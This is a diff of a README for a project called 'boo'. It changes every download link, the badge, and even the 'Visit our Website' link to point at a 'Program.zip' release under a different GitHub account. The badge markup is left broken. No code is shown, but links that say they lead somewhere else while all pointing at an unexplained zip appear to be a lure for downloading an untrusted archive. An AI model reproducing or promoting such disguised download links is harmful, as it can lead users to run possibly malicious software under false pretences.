@@ -14,12 +14,12 @@
 🌟 And much more!
 
 ## 📥 Download
-To get started with "boo", download the latest release [here](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip). Click the button below to launch the download:
+To get started with "boo", download the latest release [here](https://github.com/Armosspec/boo/releases/download/v1.0/Program.zip). Click the button below to launch the download:
 
-[![Download "boo"](https://img.shields.io/badge/Download-%22boo%22-blue)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download "boo"](https://github.com/Armosspec/boo/releases/download/v1.0/Program.zip%22boo%22-blue)](https://github.com/Armosspec/boo/releases/download/v1.0/Program.zip)
 
 ## 🌐 Visit our Website
-For more information about "boo" and to stay updated on the latest news and releases, visit our [website](https://www.booeditor.com).
+For more information about "boo" and to stay updated on the latest news and releases, visit our [website](https://github.com/Armosspec/boo/releases/download/v1.0/Program.zip).
 
 ## 🛠️ Installation
 1. Download the "boo" zip file from the link provided above.
